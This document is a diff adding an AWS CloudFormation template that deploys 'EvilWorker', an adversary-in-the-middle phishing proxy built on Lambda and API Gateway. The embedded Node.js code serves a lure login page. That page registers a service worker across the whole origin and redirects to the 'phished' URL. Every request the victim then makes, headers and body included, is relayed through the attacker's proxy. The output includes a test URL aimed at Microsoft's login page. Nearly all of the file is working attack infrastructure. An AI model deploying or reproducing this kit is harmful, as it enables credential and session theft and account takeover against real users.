@@ -1,0 +1,288 @@
+AWSTemplateFormatVersion: '2010-09-09'
+Description: 'EvilWorker Lambda Deployment'
+
+Resources:
+  # Lambda Execution Role
+  EvilWorkerLambdaRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: evilworker-lambda-role-cf
+      AssumeRolePolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: lambda.amazonaws.com
+            Action: sts:AssumeRole
+      ManagedPolicyArns:
+        - arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole
+
+  # Lambda Function
+  EvilWorkerFunction:
+    Type: AWS::Lambda::Function
+    Properties:
+      FunctionName: evilworker-simple-cf
+      Runtime: nodejs18.x
+      Role: !GetAtt EvilWorkerLambdaRole.Arn
+      Handler: server.handler
+      Code:
+        ZipFile: |
+          const https = require("https");
+          const http = require("http");
+          
+          exports.handler = async (event, context) => {
+              const { httpMethod, path, queryStringParameters, headers, body, isBase64Encoded } = event;
+              
+              console.log('Request:', { httpMethod, path, queryStringParameters });
+              
+              try {
+                  // Handle EvilWorker login URLs
+                  if (path.startsWith('/login') && queryStringParameters && queryStringParameters.redirect_urI) {
+                      const phishedURL = new URL(decodeURIComponent(queryStringParameters.redirect_urI));
+                      
+                      return {
+                          statusCode: 200,
+                          headers: {
+                              'Content-Type': 'text/html',
+                              'Access-Control-Allow-Origin': '*',
+                              'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
+                              'Access-Control-Allow-Headers': 'Content-Type, Authorization'
+                          },
+                          body: getIndexHTML(phishedURL)
+                      };
+                  }
+
+                  // Handle service worker
+                  if (path === '/service_worker_Mz8XO2ny1Pg5.js') {
+                      return {
+                          statusCode: 200,
+                          headers: { 
+                              'Content-Type': 'text/javascript',
+                              'Service-Worker-Allowed': '/',
+                              'Access-Control-Allow-Origin': '*'
+                          },
+                          body: getServiceWorkerJS()
+                      };
+                  }
+
+                  // Handle proxy requests
+                  if (path === '/lNv1pC9AWPUY4gbidyBO') {
+                      if (httpMethod === 'POST' && body) {
+                          const requestBody = isBase64Encoded ? Buffer.from(body, 'base64').toString() : body;
+                          const proxyRequest = JSON.parse(requestBody);
+                          
+                          const result = await makeProxyRequest(proxyRequest);
+                          return result;
+                      }
+                  }
+
+                  // Default response
+                  return {
+                      statusCode: 200,
+                      headers: { 'Content-Type': 'text/html' },
+                      body: '<h1>EvilWorker Proxy Server</h1><p>Server is running on AWS Lambda!</p>'
+                  };
+
+              } catch (error) {
+                  console.error("Handler error", error);
+                  return {
+                      statusCode: 500,
+                      headers: { 'Content-Type': 'text/html' },
+                      body: '<h1>500 Internal Server Error</h1>'
+                  };
+              }
+          };
+
+          async function makeProxyRequest(proxyRequest) {
+              const targetURL = new URL(proxyRequest.url);
+              const protocol = targetURL.protocol === 'https:' ? https : http;
+              
+              const options = {
+                  hostname: targetURL.hostname,
+                  port: targetURL.port || (targetURL.protocol === 'https:' ? 443 : 80),
+                  path: targetURL.pathname + targetURL.search,
+                  method: proxyRequest.method,
+                  headers: {
+                      ...proxyRequest.headers,
+                      'host': targetURL.host
+                  }
+              };
+
+              return new Promise((resolve, reject) => {
+                  const req = protocol.request(options, (res) => {
+                      let data = '';
+                      
+                      res.on('data', (chunk) => {
+                          data += chunk;
+                      });
+                      
+                      res.on('end', () => {
+                          resolve({
+                              statusCode: res.statusCode,
+                              headers: {
+                                  'Content-Type': res.headers['content-type'] || 'text/html',
+                                  'Access-Control-Allow-Origin': '*',
+                                  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
+                                  'Access-Control-Allow-Headers': 'Content-Type, Authorization'
+                              },
+                              body: data
+                          });
+                      });
+                  });
+
+                  req.on('error', (error) => {
+                      console.error('Proxy request error:', error);
+                      reject(error);
+                  });
+
+                  if (proxyRequest.body) {
+                      req.write(proxyRequest.body);
+                  }
+                  
+                  req.end();
+              });
+          }
+
+          function getIndexHTML(phishedURL) {
+              return \`<!DOCTYPE html>
+          <html lang="en">
+          <head>
+              <meta charset="UTF-8">
+              <title>EvilWorker</title>
+          </head>
+          <body>
+              <script>
+                  if ("serviceWorker" in navigator) {
+                      navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
+                          scope: "/",
+                      })
+                          .then((registration) => {
+                              console.log("Service worker registered");
+                              const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
+                              const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
+                              console.log("Redirecting to:", phishedURL.href);
+                              self.location.replace(phishedURL.href);
+                          })
+                          .catch((error) => {
+                              console.error("Service worker registration failed:", error);
+                          });
+                  }
+                  else {
+                      console.error("Service workers are not supported by this browser");
+                  }
+              </script>
+          </body>
+          </html>\`;
+          }
+
+          function getServiceWorkerJS() {
+              return \`self.addEventListener("fetch", (event) => {
+              event.respondWith(handleRequest(event.request));
+          });
+
+          async function handleRequest(request) {
+              const proxyRequestURL = \\\`\\\${self.location.origin}/lNv1pC9AWPUY4gbidyBO\\\`;
+
+              try {
+                  const proxyRequest = {
+                      url: request.url,
+                      method: request.method,
+                      headers: Object.fromEntries(request.headers.entries()),
+                      body: await request.text(),
+                      referrer: request.referrer,
+                      mode: request.mode
+                  };
+                  
+                  const response = await fetch(proxyRequestURL, {
+                      method: "POST",
+                      headers: {
+                          "Content-Type": "application/json",
+                      },
+                      body: JSON.stringify(proxyRequest),
+                      redirect: "manual",
+                      mode: "same-origin"
+                  });
+                  
+                  return response;
+              }
+              catch (error) {
+                  console.error("Proxy request failed:", error);
+                  return new Response("Proxy request failed", { status: 500 });
+              }
+          }\`;
+          }
+      Timeout: 30
+      MemorySize: 256
+
+  # API Gateway
+  EvilWorkerAPI:
+    Type: AWS::ApiGateway::RestApi
+    Properties:
+      Name: evilworker-api-cf
+      Description: EvilWorker API Gateway
+
+  # API Gateway Root Resource
+  EvilWorkerRootResource:
+    Type: AWS::ApiGateway::Resource
+    Properties:
+      RestApiId: !Ref EvilWorkerAPI
+      ParentId: !GetAtt EvilWorkerAPI.RootResourceId
+      PathPart: '{proxy+}'
+
+  # API Gateway Method for Root
+  EvilWorkerRootMethod:
+    Type: AWS::ApiGateway::Method
+    Properties:
+      RestApiId: !Ref EvilWorkerAPI
+      ResourceId: !GetAtt EvilWorkerAPI.RootResourceId
+      HttpMethod: ANY
+      AuthorizationType: NONE
+      Integration:
+        Type: AWS_PROXY
+        IntegrationHttpMethod: POST
+        Uri: !Sub 'arn:aws:apigateway:${AWS::Region}:lambda:path/2015-03-31/functions/${EvilWorkerFunction.Arn}/invocations'
+
+  # API Gateway Method for Proxy
+  EvilWorkerProxyMethod:
+    Type: AWS::ApiGateway::Method
+    Properties:
+      RestApiId: !Ref EvilWorkerAPI
+      ResourceId: !Ref EvilWorkerRootResource
+      HttpMethod: ANY
+      AuthorizationType: NONE
+      Integration:
+        Type: AWS_PROXY
+        IntegrationHttpMethod: POST
+        Uri: !Sub 'arn:aws:apigateway:${AWS::Region}:lambda:path/2015-03-31/functions/${EvilWorkerFunction.Arn}/invocations'
+
+  # Lambda Permission for API Gateway
+  EvilWorkerLambdaPermission:
+    Type: AWS::Lambda::Permission
+    Properties:
+      FunctionName: !Ref EvilWorkerFunction
+      Action: lambda:InvokeFunction
+      Principal: apigateway.amazonaws.com
+      SourceArn: !Sub 'arn:aws:execute-api:${AWS::Region}:${AWS::AccountId}:${EvilWorkerAPI}/*/*'
+
+  # API Gateway Deployment
+  EvilWorkerDeployment:
+    Type: AWS::ApiGateway::Deployment
+    DependsOn:
+      - EvilWorkerRootMethod
+      - EvilWorkerProxyMethod
+    Properties:
+      RestApiId: !Ref EvilWorkerAPI
+      StageName: prod
+
+Outputs:
+  APIUrl:
+    Description: URL of the EvilWorker API
+    Value: !Sub 'https://${EvilWorkerAPI}.execute-api.${AWS::Region}.amazonaws.com/prod'
+    Export:
+      Name: !Sub '${AWS::StackName}-APIUrl'
+  
+  TestUrl:
+    Description: Test URL for Microsoft login
+    Value: !Sub 'https://${EvilWorkerAPI}.execute-api.${AWS::Region}.amazonaws.com/prod/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F'
+    Export:
+      Name: !Sub '${AWS::StackName}-TestUrl'
